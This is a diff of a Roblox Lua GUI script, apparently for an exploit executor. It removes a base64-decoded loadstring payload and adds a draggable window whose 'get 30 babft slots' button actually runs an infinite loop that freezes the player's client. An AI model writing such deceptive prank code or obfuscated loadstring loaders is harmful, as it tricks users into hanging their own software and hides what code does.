@@ -1,16 +1,123 @@
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-function dec(data)
-    data = string.gsub(data, '[^'..b..'=]', '')
-    return (data:gsub('.', function(x)
-        if (x == '=') then return '' end
-        local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
-        return r;
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if (#x ~= 8) then return '' end
-        local c=0
-        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
-        return string.char(c)
-    end))
+--// Clean, Draggable GUI Script (All elements visible!)
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "MainCustomGui"
+gui.Parent = game.CoreGui
+
+--// Main Frame
+local frame = Instance.new("Frame")
+frame.Name = "MainFrame"
+frame.Parent = gui
+frame.Size = UDim2.new(0.38, 0, 0.32, 0) -- 38% width, 32% height
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+frame.BorderSizePixel = 0
+
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 16)
+frameCorner.Parent = frame
+
+--// Title Label
+local title = Instance.new("TextLabel")
+title.Name = "TitleLabel"
+title.Parent = frame
+title.Size = UDim2.new(0.8, 0, 0.22, 0) -- 80% width, 22% height
+title.Position = UDim2.new(0.05, 0, 0.06, 0) -- 5% from left, 6% from top
+title.BackgroundTransparency = 1
+title.Text = "made by i want to be famouse"
+title.TextColor3 = Color3.fromRGB(230, 230, 230)
+title.Font = Enum.Font.GothamSemibold
+title.TextSize = 32
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.TextYAlignment = Enum.TextYAlignment.Center
+
+--// Close Button (Red, Rounded)
+local closeBtn = Instance.new("TextButton")
+closeBtn.Name = "CloseButton"
+closeBtn.Parent = frame
+closeBtn.Size = UDim2.new(0.12, 0, 0.22, 0) -- 12% width, 22% height
+closeBtn.Position = UDim2.new(0.83, 0, 0.06, 0) -- right-aligned with margin
+closeBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.new(1, 1, 1)
+closeBtn.Font = Enum.Font.GothamSemibold
+closeBtn.TextSize = 26
+closeBtn.BorderSizePixel = 0
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 10)
+closeCorner.Parent = closeBtn
+
+closeBtn.MouseButton1Click:Connect(function()
+    gui:Destroy()
+end)
+
+--// Main Button (Clean style)
+local button = Instance.new("TextButton")
+button.Name = "MainButton"
+button.Parent = frame
+button.Size = UDim2.new(0.9, 0, 0.28, 0) -- 90% width, 28% height
+button.Position = UDim2.new(0.05, 0, 0.55, 0) -- 5% from left, 55% from top
+button.BackgroundColor3 = Color3.fromRGB(70, 140, 255)
+button.Text = "get 30 babft slots"
+button.TextColor3 = Color3.new(1, 1, 1)
+button.Font = Enum.Font.GothamSemibold
+button.TextSize = 28
+button.BorderSizePixel = 0
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 12)
+buttonCorner.Parent = button
+
+-- Button hover effect
+button.MouseEnter:Connect(function()
+    button.BackgroundColor3 = Color3.fromRGB(90, 160, 255)
+end)
+button.MouseLeave:Connect(function()
+    button.BackgroundColor3 = Color3.fromRGB(70, 140, 255)
+end)
+
+button.MouseButton1Click:Connect(function()
+    -- WARNING: The following loop will freeze your client!
+    while true do
+    end
+end)
+
+--// Make Frame Draggable
+local UserInputService = game:GetService("UserInputService")
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(
+        startPos.X.Scale, startPos.X.Offset + delta.X,
+        startPos.Y.Scale, startPos.Y.Offset + delta.Y
+    )
 end
-loadstring(dec('bG9jYWwgZ3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQpndWkuUGFyZW50ID0gZ2FtZS5Db3JlR3VpCgpsb2NhbCBmcmFtZSA9IEluc3RhbmNlLm5ldygicmFtZSIpCmZyYW1lLlBhcmVudCA9IGd1aQpmcmFtZS5TaXplID0gVURpbTIubmV3KDAsIDI1MCwgMCwgMTIwKQpmcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0xMjUsIDAuNSwgLTYwKQpmcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNjAsIDYwLCA2MCkKZnJhbWUuQm9yZGVyU2l6ZVBpeGVsID0gMAoKbG9jYWwgVXNlcklucHV0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCmxvY2FsIGRyYWdnaW5nLCBkcmFnSW5wdXQsIGRyYWdTdGFydCwgc3RhcnRQb3MKbG9jYWwgZnVuY3Rpb24gdXBkYXRlKGlucHV0KQogICAgbG9jYWwgZGVsdGEgPSBpbnB1dC5Qb3NpdGlvbiAtIGRyYWdTdGFydAogICAgZnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoCiAgICAgICAgc3RhcnRQb3MuWFNjYWxlLCBzdGFydFBvcy5YT2Zmc2V0ICsgZGVsdGEuWCwKICAgICAgICBzdGFydFBvcy5ZU2NhbGUsIHN0YXJ0UG9zLllPZmZzZXQgKyBkZWx0YS5ZCiAgICApCmVuZApmcmFtZS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgIGRyYWdnaW5nID0gdHJ1ZQogICAgICAgIGRyYWdTdGFydCA9IGlucHV0LlBvc2l0aW9uCiAgICAgICAgc3RhcnRQb3MgPSBmcmFtZS5Qb3NpdGlvbgogICAgICAgIGlucHV0LkNoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFN0YXRlID09IEVudW0uVXNlcklucHV0U3RhdGUuRW5kIHRoZW4KICAgICAgICAgICAgICAgIGRyYWdnaW5nID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZCkKZnJhbWUuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZU1vdmVtZW50IG9yIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4KICAgICAgICBkcmFnSW5wdXQgPSBpbnB1dAogICAgZW5kCmVuZCkKVXNlcklucHV0U2VydmljZS5JbnB1dENoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKICAgIGlmIGlucHV0ID09IGRyYWdJbnB1dCBhbmQgZHJhZ2dpbmcgdGhlbgogICAgICAgIHVwZGF0ZShpbnB1dCkKICAgIGVuZCplbmQpCgpsb2NhbCB0aXRsZSA9IEluc3RhbmNlLm5ldygidGV4dGxhYmVsIikKdGl0bGUuUGFyZW50ID0gZnJhbWUKdGl0bGUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKdGl0bGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMCwgMCkKdGl0bGUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKdGl0bGUuVGV4dCA9ICJtYWRlIGJ5IGkgd2FudCB0byBiZSBmYW1vdXNlIg=='))()
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
